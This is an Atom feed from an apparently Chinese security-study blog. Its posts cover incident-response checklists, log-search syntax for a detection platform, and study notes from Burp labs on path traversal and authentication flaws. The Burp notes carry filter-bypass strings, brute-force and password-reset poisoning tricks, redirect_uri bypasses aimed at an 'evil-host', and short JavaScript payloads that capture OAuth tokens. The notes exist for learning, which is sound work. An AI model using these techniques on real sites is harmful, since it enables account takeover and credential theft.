<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Vegetable Blog</title>
  
  
  <link href="http://ericcd.com/atom.xml" rel="self"/>
  
  <link href="http://ericcd.com/"/>
  <updated>2023-05-01T13:19:37.489Z</updated>
  <id>http://ericcd.com/</id>
  
  <author>
    <name>EricCD</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>应急响应基础知识</title>
    <link href="http://ericcd.com/2023/05/01/hvv-3/"/>
    <id>http://ericcd.com/2023/05/01/hvv-3/</id>
    <published>2023-05-01T06:26:13.000Z</published>
    <updated>2023-05-01T13:19:37.489Z</updated>
    
    <content type="html"><![CDATA[<p>应急响应基础知识总结<br /><span id="more"></span></p><h1 id="实战下的应急响应"><a class="anchor" href="#实战下的应急响应">#</a> 实战下的应急响应</h1><h2 id="web-攻击"><a class="anchor" href="#web-攻击">#</a> web 攻击</h2><ol><li><p>相关表现：页面被篡改，恶意推广，黑词黑页，webshell。</p></li><li><p>相关危害：导致搜索引擎告警、微信等 app 分享告警、首页敏感内容、脱库、内网沦陷等。</p></li><li><p>排查要点：能否多个环境下复现异常；确认相关资产是否存在；而已文件是否存在于服务器上。</p></li><li><p>操作要点：备份文件，webshell 后门查杀，web 日志分析，web 中间件缓存处理，web 中间件配置检查，重启 web 中间件，服务器后门检查。</p></li><li><p>防护措施：加固相关 web 应用，修改相关系统的所有用户密码。</p></li></ol><h2 id="链路劫持"><a class="anchor" href="#链路劫持">#</a> 链路劫持</h2><ol><li><p>相关表现：区域性服务不可用或返回错误内容。</p></li><li><p>相关危害：导致搜索引擎告警、微信等 app 分享告警、首页敏感内容等。</p></li><li><p>排查要点：能否在多个环境下复现异常，确定相关资产是否存在，恶意文件是否确实存在于服务器上。</p></li><li><p>操作要点：跨地区、运营商进行测试，确定受影响范围，在能复现的环境中判断是 DNS 劫持还是 HTTP 劫持。</p></li><li><p>防护措施：重要业务部署 https。</p></li></ol><h2 id="代理隧道"><a class="anchor" href="#代理隧道">#</a> 代理隧道</h2><ol><li><p>相关表现：持续性或间接性外连行为，通常为 tcp 协议，对内网多个主机有访问行为。</p></li><li><p>相关危害：作为跳板机攻击其它内网资产。</p></li><li><p>排查要点：确定存在代理隧道的跳板机，通常为某时间段内集中访问内网多种资源的机器，判断隧道类型。</p></li><li><p>防护措施：完善内网 acl，服务器按业务需要通过白名单策略访问外网。</p></li></ol><h2 id="替换系统命令"><a class="anchor" href="#替换系统命令">#</a> 替换系统命令</h2><ol><li><p>相关表现：无明显表现。</p></li><li><p>相关危害：将后门、木马持久化在系统中，窃取账号、密码等重要凭证。</p></li><li><p>排查要点：使用包管理自带的包校验功能验证文件完整性，分析恶意文件行为，确定影响面。</p></li><li><p>操作要点：使用静态链接的 busybox，重新安装被替换的包。</p></li><li><p>命令：rpm -Va； dpkg --verify</p></li></ol><h2 id="ldsopreload-动态链接库劫持"><a class="anchor" href="#ldsopreload-动态链接库劫持">#</a> ld.so.preload 动态链接库劫持</h2><ol><li><p>相关表现：无明显表现</p></li><li><p>相关危害：将后门、木马持久化在系统中；窃取账号、密码等重要凭证。</p></li><li><p>排查要点：检查 /etc/ld,so.preload，<span class="exturl" data-url="aHR0cDovL2xkLnNv">ld.so</span> (如 /lib/x86_64-linux-gnu/ld-2,<span class="exturl" data-url="aHR0cDovLzI3LnNv">27.so</span>)</p></li><li><p>操作要点：使用静态链接的 busybox；重启被注入恶意模块的进程，必要时直接重启系统。</p></li></ol><h2 id="内核态-rootkit"><a class="anchor" href="#内核态-rootkit">#</a> 内核态 rootkit</h2><ol><li><p>相关表现：无明显表现。</p></li><li><p>相关危害：将后门、木马持久化在系统中；隐藏文件、进程等信息。</p></li><li><p>排查要点：确定是否存在无法使用常规命令查看的文件或进程。</p></li><li><p>操作要点：使用 tyton 内核态 rootkit 检测工具检测，检查 /etc/modules 是否有未知的内核模块。</p></li></ol><h2 id="计划任务"><a class="anchor" href="#计划任务">#</a> 计划任务</h2><ol><li><p>相关表现：特定时间触发木马、后门、网络链接、DNS 请求、篡改页面等等行为。</p></li><li><p>相关危害：将后门、木马持久化在系统中，周期性篡改页面、拉取数据等。</p></li><li><p>排查要点：判断是否存在周期性出现的异常现象，检查 /var/spool/cron/crontabs/，/etc/cron.* 等常用计划任务配置文件。</p></li><li><p>操作要点：停止计划任务后再操作，注意辨别利用 \r 回车符的障眼法小技巧。</p></li></ol><h2 id="远控木马"><a class="anchor" href="#远控木马">#</a> 远控木马</h2><ol><li><p>相关表现：有持续性或间断性的对外网络链接或 DNS 请求等通信行为。</p></li><li><p>相关危害：窃取系统资料，作为跳板进一步攻击内网其它机器。</p></li><li><p>排查要点：关注 tcp、udp、icmp 等一切网络行为，检查注册表、服务、开机目录、计划任务等一些列常见的持久化点。</p></li><li><p>操作要点：检查网络连接，以及 IDS 设备上的异常远控告警。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;应急响应基础知识总结&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>应急响应基础知识</title>
    <link href="http://ericcd.com/2023/05/01/hvv-4/"/>
    <id>http://ericcd.com/2023/05/01/hvv-4/</id>
    <published>2023-05-01T06:26:13.000Z</published>
    <updated>2023-05-03T07:03:39.064Z</updated>
    
    <content type="html"><![CDATA[<p>应急响应基础流程<br /><span id="more"></span></p><h1 id="linux"><a class="anchor" href="#linux">#</a> Linux</h1><h2 id="关键目录"><a class="anchor" href="#关键目录">#</a> 关键目录</h2><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/etc/passwd              用户信息文件 </span><br><span class="line">/etc/crontab             定时任务文件 </span><br><span class="line">/etc/anacrontab          异步定时文件 </span><br><span class="line">/etc/rc.d/rc.local       开机启动项 </span><br><span class="line">/var/log/btmp            登录失败日志，使用 lastb 查看 </span><br><span class="line">/var/log/cron            定时任务执行日志 </span><br><span class="line">/var/log/lastlog         所有用户登录信息，使用 lastlog 查看 </span><br><span class="line">/var/log/secure          验证、授权等日志 </span><br><span class="line">/var/log/wtmp            包含用户登录日志，使用 last 命令查看 </span><br><span class="line">/var/log/utmp            当前登陆系统的用户信息，使用 last 查看 </span><br></pre></td></tr></table></figure></p><h2 id="常用命令"><a class="anchor" href="#常用命令">#</a> 常用命令</h2><ol><li><p>检查异常别名：alias</p></li><li><p>检查计划任务：<br />cat /var/spool/cron/crontabs/*<br />crontab -l</p></li><li><p>查看创建时间：stat</p></li><li><p>检查网络连接：netstat -antpl</p></li><li><p>检查后门账号：cat /etc/passwd</p></li><li><p>检查进程：top, ps -aux</p></li><li><p>检查 gpu：nvidia-smi</p></li><li><p>根据 pid 查看对应可执行程序： ls -alh /proc/pid</p></li><li><p>开放端口进程： lsof -i:5678</p></li><li><p>查看历史命令：history，cat ~/.bash_history</p></li><li><p>查看当前目录下所有文件并排序：ls -alt</p></li><li><p>校验 RPM 软件包：rpm -Va，dpkg -verify</p></li><li><p>查看系统服务：service --status-all</p></li></ol><h1 id="windows"><a class="anchor" href="#windows">#</a> Windows</h1><ol><li><p>查看系统进程：tasklist</p></li><li><p>查看网络情况：netstat -ant</p></li><li><p>查看计划任务：任务计划程序</p></li><li><p>任务管理器查看进程和服务</p></li><li><p>检查注册表</p></li><li><p>安全工具检测</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;应急响应基础流程&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>天眼学习</title>
    <link href="http://ericcd.com/2023/04/30/hvv-sky/"/>
    <id>http://ericcd.com/2023/04/30/hvv-sky/</id>
    <published>2023-04-30T06:26:13.000Z</published>
    <updated>2023-04-30T08:41:14.630Z</updated>
    
    <content type="html"><![CDATA[<p>天眼相关知识总结<br /><span id="more"></span></p><h1 id="常见协议字段与语法"><a class="anchor" href="#常见协议字段与语法">#</a> 常见协议字段与语法</h1><h2 id="天眼日志检索语法"><a class="anchor" href="#天眼日志检索语法">#</a> 天眼日志检索语法</h2><p>1 基本语法：<br />字段 ： 项 运算符 字段 ： 项</p><ol start="2"><li><p>通配符查询<br />？ 和 * 的区别</p></li><li><p>范围查询<br /> [&quot;192.168.00&quot; TO &quot;192.168.255.255&quot;]</p></li></ol><h2 id="协议字段"><a class="anchor" href="#协议字段">#</a> 协议字段</h2><ol><li><p>威胁告警搜索字段<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">attack_sip          攻击者 ip</span><br><span class="line">alarm_sip           受害者 ip</span><br><span class="line">attack_type         攻击类型 </span><br><span class="line">is_web_attack       用于标记告警是否为 web 告警 </span><br><span class="line">_hazard_level       威胁级别 </span><br></pre></td></tr></table></figure></p></li><li><p>网络协议公共字段<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">access_time 日志生成时间 </span><br><span class="line"> 采集器采集到该数据包并解析完成生成日志的时间戳 </span><br><span class="line"></span><br><span class="line">@timestamp 时间戳 </span><br><span class="line"> 日志在分析平台存储入库时添加 </span><br><span class="line"></span><br><span class="line">sip 源 ip</span><br><span class="line"> 网络数据流发起的 ip</span><br><span class="line"></span><br><span class="line">sport 源端口 </span><br><span class="line"> 网络数据流的客户端应用入口 </span><br><span class="line"></span><br><span class="line">dip 目的 ip</span><br><span class="line"> 网络数据流的服务端 ip</span><br><span class="line"></span><br><span class="line">dport 目的端口 </span><br><span class="line"> 网络数据流的服务端应用端口 </span><br><span class="line"></span><br><span class="line">geo</span><br><span class="line">ip 对应的物理地址 </span><br></pre></td></tr></table></figure></p></li></ol><p>3.TCP&amp;UDP 协议字段<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">proto 协议 </span><br><span class="line">ip 包头中的协议字段值 </span><br><span class="line"></span><br><span class="line">uplink_length 上行字节数 </span><br><span class="line"> 从 TCP 流的建立到该流的结束，从客户端发往服务器端的应用层字节总数 </span><br><span class="line"></span><br><span class="line">downlink_length 下行字节数 </span><br><span class="line"> 从 TCP 流建立到结束，从服务器端发往客户端的应用层数据的字节总数 </span><br><span class="line"></span><br><span class="line">src_mac 源 mac</span><br><span class="line">tcp 数据流的源 mac 地址 </span><br><span class="line"></span><br><span class="line">dst_mac 目的 mac</span><br><span class="line">tcp 数据流的目的 mac 地址 </span><br><span class="line"></span><br><span class="line">up_payload 上行前 100 字节 </span><br><span class="line"> 从 tcp 流建立起，从客户端发往服务器端应用层的前 100 个字节 </span><br><span class="line"></span><br><span class="line">down_payoad 下行前 100 字节 </span><br><span class="line"> 从 tcp 流建立起，从服务器端发往客户端应用层的前 100 个字节 </span><br></pre></td></tr></table></figure><br />3.HTTP 协议字段<br /> xff：请求端真实 ip 和代理</p><p>4.HTTP 状态码<br /> 100：continue；继续。客户端应继续其请求。<br />302：Found；临时移动，与 301 类似，但资源只是临时移动，客户端应继续使用原有 URL<br />400：Bad Request；客户端请求的语法错误，服务器无法理解。<br />401：Unauthorized；请求要求用户的身份认证。<br />402：Payment Required；保留，将来使用。<br />405：Method Not Allowed；客户端请求中的方法被静止。<br />500：Internal Server Error；服务器内部错误，无法完成请求。<br />502：Bad Gateway；作为网关或者代理工作的服务器尝试请求时，从远程服务器接收到一个无效响应。</p><p>4.DNS 协议字段：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">des_type DNS 访问类型 </span><br><span class="line"></span><br><span class="line">host HOST</span><br><span class="line"> 请求的域名信息 </span><br><span class="line"></span><br><span class="line">addr 地址资源 </span><br><span class="line">DNS 的 A 记录，表示该 host 对应的 IP 地址信息，可能有多个记录 </span><br><span class="line"></span><br><span class="line">mx 邮件交换记录 </span><br><span class="line"></span><br><span class="line">cname 域名的规范名称 </span><br><span class="line"> 表示该 host 域名的其它别名记录 </span><br></pre></td></tr></table></figure></p><p>5.SSL 协议字段<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">version 版本号 </span><br><span class="line">SSL 的版本号 </span><br><span class="line"></span><br><span class="line">server_name 服务器的名称 </span><br><span class="line">SSL client_hello 报文中的扩展字段，通过该字段判断客户端和哪个站点进行交互 </span><br><span class="line"></span><br><span class="line">issuer_name 证书颁发者名称 </span><br><span class="line"></span><br><span class="line">notbefore 证书有效期起始时间 </span><br><span class="line"></span><br><span class="line">notafter 证书有效期起始时间 </span><br><span class="line"></span><br><span class="line">public_key 证书公钥 </span><br><span class="line"></span><br><span class="line">user_name Server 端的证书使用者 </span><br></pre></td></tr></table></figure></p><ol start="6"><li><p>文件传输协议字段<br /> proto; trans_mode; file_name; file_md5; mimie_tupe; uri; host; referer; status; file_dir; mothod</p></li><li><p>登录协议字段<br /> proto; passwd; info; user; db_type; normal_ret</p></li><li><p>邮件协议<br /> proto; time; from; to; cc; subject; references; attach_name; attach_md5; mime_type; plain</p></li></ol><h2 id="数据库操作"><a class="anchor" href="#数据库操作">#</a> 数据库操作</h2><ol><li>数据库查询字段<br /> proto; version; user; db_name; db_type; ret_code; sql_info</li></ol><h1 id="web-攻击处理"><a class="anchor" href="#web-攻击处理">#</a> web 攻击处理</h1><ol><li><p>备份文件<br />下载对应备份文件，分析并判断影响，是否删除对应文件。</p></li><li><p>自动目录列表<br />响应体中的 “Directory” 会出发警告，此时应该访问对应文件，分析目录信息，判断影响，修改配置文件，禁止目录列表列出。</p></li><li><p>目录穿越<br />请求头包含../../ 触发警告，应该对输入参数进行过滤。</p></li></ol><p>4.svn 源码泄露<br /> URL“/.svn/entries” 与响应体 svn 信息触发规则告警，应禁止或删除.svn 文件。</p><ol start="5"><li>弱口令<br />查看是否包含返回成功的字段或数据，溯源 sip 或自己登录尝试，例如 tomcat 与 basic 认证弱口令信息在 Authorization 中，可用 base64 解密。<br />根据流量分析暴力破解行文，以下是一些常见的筛选语句：<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HTTP 登录爆破，协议类型 web 日志：</span><br><span class="line">sip:(&quot;ip&quot;) AND dip:(&quot;ip&quot;) AND data:(&quot; 账号 & quot;)</span><br><span class="line"></span><br><span class="line">FTP,SMTP,Telnet,SSH,mysql 数据库等登录爆破，协议登录动作：</span><br><span class="line">sip:(&quot;ip&quot;) AND dip:(&quot;ip&quot;) AND proto:(&quot; 爆破协议 & quot;)</span><br><span class="line"></span><br><span class="line"> 过滤爆破登录成功：</span><br><span class="line">sip:(&quot;ip&quot;) AND dip:(&quot;ip&quot;) AND proto:(&quot; 爆破协议 & quot;) AND NOT （info:fail* OR info:530）</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="xss"><a class="anchor" href="#xss">#</a> XSS</h2><p>检查是否存在 xss 的 payload，看是否存在实体化。</p><h2 id="sql-注入"><a class="anchor" href="#sql-注入">#</a> SQL 注入</h2><p>检查数据库是否返回相应信息，根据返回页面长度判断是否注入成功，根据网站延时判断注入是否成功。基本都是根据相应时间，响应头，响应体判断。</p><h2 id="文件上传"><a class="anchor" href="#文件上传">#</a> 文件上传</h2><p>首先判断是否存在危险文件上传，再根据返回信息判断是否上传成功。<br />检查语法：uri:(&quot;文件名&quot;)</p><h2 id="文件包含"><a class="anchor" href="#文件包含">#</a> 文件包含</h2><p>检查响应体</p><h2 id="webshell"><a class="anchor" href="#webshell">#</a> webshell</h2><ol><li>哥斯拉通信：上下文流量分析。</li><li>冰蝎：密钥协商，加密传输。</li></ol><h2 id="命令执行"><a class="anchor" href="#命令执行">#</a> 命令执行</h2><p>同前文。</p><h2 id="网络攻击"><a class="anchor" href="#网络攻击">#</a> 网络攻击</h2><p>看载荷，看是否有外接系统</p><h2 id="小结"><a class="anchor" href="#小结">#</a> 小结</h2><ol><li>企图报警也要看</li><li>告警分析核心要素：请求与相应</li></ol><h1 id="威胁情报"><a class="anchor" href="#威胁情报">#</a> 威胁情报</h1><h2 id="远控木马"><a class="anchor" href="#远控木马">#</a> 远控木马</h2><p>根据 IOC 信息查询，查询是否有主机访问对应 URL。</p><h2 id="挖矿木马"><a class="anchor" href="#挖矿木马">#</a> 挖矿木马</h2><p>查看流量日志是否存在挖矿流量，检测链接是否存活</p><h2 id="勒索病毒"><a class="anchor" href="#勒索病毒">#</a> 勒索病毒</h2><p>是否存在大量恶意域名请求，自身是否存在漏洞，检测是否存在横向传播，奇安信有检测平台</p><h2 id="小结-2"><a class="anchor" href="#小结-2">#</a> 小结</h2><ol><li>流程：确认告警信息，分析威胁情报，匹配网络攻击行为，是否存在交互信息。</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;天眼相关知识总结&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BurpLab_3-Directory_traversal</title>
    <link href="http://ericcd.com/2022/12/22/BurpLab-3/"/>
    <id>http://ericcd.com/2022/12/22/BurpLab-3/</id>
    <published>2022-12-22T12:44:54.000Z</published>
    <updated>2023-04-04T11:59:32.368Z</updated>
    
    <content type="html"><![CDATA[<p>记录在做 burp lab 时学会的知识点。<br /><span id="more"></span></p><ol><li>一个简单特点<br /> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;img src=&quot;/loadImage?filename=1.png&quot;&gt;</span><br></pre></td></tr></table></figure></li><li>有的服务器会禁止使用相对地址，可以尝试使用绝对地址。</li><li>有的会替换掉一些关键字符，试着用....// 或 ..../ 绕过。</li><li>爆破</li><li>有的要求固定文件路径开头</li><li>有的要求以特定格式（比如.png）结尾，用 %00 做截断。</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BurpLab_2-Authentication</title>
    <link href="http://ericcd.com/2022/12/22/BurpLab-2/"/>
    <id>http://ericcd.com/2022/12/22/BurpLab-2/</id>
    <published>2022-12-22T12:44:54.000Z</published>
    <updated>2023-03-27T07:40:03.603Z</updated>
    
    <content type="html"><![CDATA[<p>记录在做 burp lab 时学会的知识点。<br /><span id="more"></span></p><h1 id="authentication-vulnerabilities"><a class="anchor" href="#authentication-vulnerabilities">#</a> Authentication vulnerabilities</h1><h2 id="vulnerabilities-in-password-based-login"><a class="anchor" href="#vulnerabilities-in-password-based-login">#</a> Vulnerabilities in password-based login</h2><h3 id="brute-force-attacks"><a class="anchor" href="#brute-force-attacks">#</a> Brute-force attacks</h3><h4 id="username-enumeration"><a class="anchor" href="#username-enumeration">#</a> Username enumeration</h4><p>1.Status codes<br />2.Error messages<br />3.Response times<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">X-Forwarded-For 是用来识别通过 HTTP 代理或负载均衡方式连接到 Web 服务器的客户端最原始的 IP 地址的 HTTP 请求头字段。，用它伪装 IP 地址来绕过对暴力破解的限制。</span><br></pre></td></tr></table></figure></p><h3 id="flawed-brute-force-protection"><a class="anchor" href="#flawed-brute-force-protection">#</a> Flawed brute-force protection</h3><p>常见的暴力破解防护措施有两种：如果一个账号有太多的登录失败尝试，就封锁账号；封掉发起太多失败登录的 ip。<br />对于锁定 ip，有的后端可能会在一个 ip 地址登陆成功后重置计时器，因此可以通过间歇登录成功账号来重置计时器。</p><h4 id="account-locking"><a class="anchor" href="#account-locking">#</a> Account locking</h4><p>发现一个账号在发起一定次数的错误登陆后会被锁定，找到这个次数，然后以不超过这个次数的频率进行爆破。</p><h4 id="user-rate-limiting"><a class="anchor" href="#user-rate-limiting">#</a> User rate limiting</h4><p>发现账号密码以如下的 json 表格进行传输。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><br /> 将表格中的密码部分修改为数组形式，最后效果如下。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;username&quot; : &quot;carlos&quot;,</span><br><span class="line">&quot;password&quot; : [</span><br><span class="line">    &quot;123456&quot;,</span><br><span class="line">    &quot;password&quot;,</span><br><span class="line">    &quot;qwerty&quot;</span><br><span class="line">    ...</span><br><span class="line">]&#125;</span><br></pre></td></tr></table></figure><br /> 发送请求，收到一个 302 的 response，选择讲此 response 在浏览器中显示，并讲 url 复制到浏览器中，成功登录账号。</p><h3 id="http-basic-authentication"><a class="anchor" href="#http-basic-authentication">#</a> HTTP basic authentication</h3><p>这种授权方式较少通过爆破绕过，可以试下 CSRF</p><h2 id="vulnerabilities-in-multi-factor-authentication"><a class="anchor" href="#vulnerabilities-in-multi-factor-authentication">#</a> Vulnerabilities in multi-factor authentication</h2><h3 id="bypassing-two-factor-authentication"><a class="anchor" href="#bypassing-two-factor-authentication">#</a> Bypassing two-factor authentication</h3><p>在有的 two-factor authentication 中，有的程序员由于疏忽，在第一次账户登录后就将用户标记为登录状态，而并非在第二次验证通过后才进行此操作，<br />因此我们可以在第一次账户登陆后，直接由 url 跳转到账户页面，从而绕过第二次验证。</p><h3 id="flawed-two-factor-verification-logic"><a class="anchor" href="#flawed-two-factor-verification-logic">#</a> Flawed two-factor verification logic</h3><p>在第二次验证时，由于使用 account 来判断进行验证的账号，因此可以先使用自己的账号密码登录，在第二次验证时修改协议中的 account 为目标账号，并对验证进行爆破。</p><h3 id="brute-forcing-2fa-verification-codes"><a class="anchor" href="#brute-forcing-2fa-verification-codes">#</a> Brute-forcing 2FA verification codes</h3><p>有的登录界面会在登陆时刷新验证码次数，所以可以使用 burp 脚本来重复登录 - 验证这一过程，达到爆破的目的。</p><h2 id="vulnerabilities-in-other-authentication-mechanisms"><a class="anchor" href="#vulnerabilities-in-other-authentication-mechanisms">#</a> Vulnerabilities in other authentication mechanisms</h2><h3 id="keeping-users-logged-in"><a class="anchor" href="#keeping-users-logged-in">#</a> Keeping users logged in</h3><p>尝试下能否逆向 cookie 或窃取 cookie。</p><h3 id="resetting-user-passwords"><a class="anchor" href="#resetting-user-passwords">#</a> Resetting user passwords</h3><ol><li>在请求修改密码的包中加入 x-forwarded-host 头指向自己的服务器，然后将账号信息设置为用户的信息，如果用户点击密码重置邮件的链接，其 token 就会转发到我们设置的服务器上去。</li><li>爆破重置密码的包</li></ol><h2 id="oauth-20-authentication-vulnerabilities"><a class="anchor" href="#oauth-20-authentication-vulnerabilities">#</a> OAuth 2.0 authentication vulnerabilities</h2><h3 id="vulnerabilities-in-the-client-application"><a class="anchor" href="#vulnerabilities-in-the-client-application">#</a> Vulnerabilities in the client application</h3><ol><li>没有使用 state 绑定导致攻击者可以通过 CSRF 将自己的邮箱绑定别人的账号。</li></ol><h3 id="vulnerabilities-in-the-oauth-service"><a class="anchor" href="#vulnerabilities-in-the-oauth-service">#</a> Vulnerabilities in the OAuth service</h3><ol><li>使用 CSRF 获取他人 code，并用得到的 code 进行登录认证。<br />有的服务器会使用白名单来筛选 redirect_uri，可以尝试绕过。<br />针对黑名单，可以采取以下方法：a. 更换表述，比如用 2130706433, 017700000001, 或 127.1. 替换 127.0.0.1、b. 注册一个自己的域名来指向想要的 ip 地址、c。使用 URL 加密等技术混淆。<br />针对白名单匹配，可以采用以下方法：a. 使用 @符号在 hostname 前存放证书，比如 <span class="exturl" data-url="aHR0cHM6Ly9leHBlY3RlZC1ob3N0OmZha2VwYXNzd29yZEBldmlsLWhvc3Q=">https://expected-host:fakepassword@evil-host</span>、b. 使用 #符号来表示 URL 片段，比如 <span class="exturl" data-url="aHR0cHM6Ly9ldmlsLWhvc3QjZXhwZWN0ZWQtaG9zdCVFMyU4MCU4MWM=">https://evil-host#expected-host、c</span>. 根据 DNS 命名规则将指定的输入存放在自己控制的 DNS 名中、d. 使用 URL 加密混淆。<br />有时还可以利用开放重定向漏洞配合目录穿越漏洞来实现网页跳转。<br />有时更改其他标志，比如将 response_mode 改为 fragment 有时也能绕过筛查。</li><li>一段 payload<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    if (!document.location.hash) &#123;</span><br><span class="line">        window.location = &#x27;URL&#x27;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        window.location = &#x27;/?&#x27;+document.location.hash.substr (1)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br />3.otherWindow.postMessage (message, targetOrigin, [transfer]);<br />message 是传递的内容，targetOrigin 是可接收的窗口。<br />以下脚本可以接收并传递传出来的信息。<br /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener (&#x27;message&#x27;, function (e) &#123;</span><br><span class="line">        fetch (&quot;/&quot; + encodeURIComponent (e.data.data))</span><br><span class="line">    &#125;, false)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br />4.HTML injection vulnerabilities<br /> 有的浏览器（比如火狐），在加载一些元素时（比如 &lt; img src=&quot;<span class="exturl" data-url="aHR0cDovL2V2aWwtdXNlci5uZXQ=">evil-user.net</span>&quot;&gt;），会将整个 URL 放在 refer 头里，包括一些我们关心的查询字符串。</li></ol><h2 id="openid-connect"><a class="anchor" href="#openid-connect">#</a> OpenID Connect</h2><p>考虑到 OpenID 是建立在 OAuth 上，许多前面提到的 OAuth 存在的问题 OpenID 也存在，接下来介绍以下由 OpenID 带来的新问题。<br />1.Unprotected dynamic client registration</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;</summary>
    
    
    
    <category term="web" scheme="http://ericcd.com/categories/web/"/>
    
    
    <category term="web" scheme="http://ericcd.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BurpLab_4-OS_command_injection</title>
    <link href="http://ericcd.com/2022/12/22/BurpLab-4/"/>
    <id>http://ericcd.com/2022/12/22/BurpLab-4/</id>
    <published>2022-12-22T12:44:54.000Z</published>
    <updated>2023-04-05T03:22:08.580Z</updated>
    
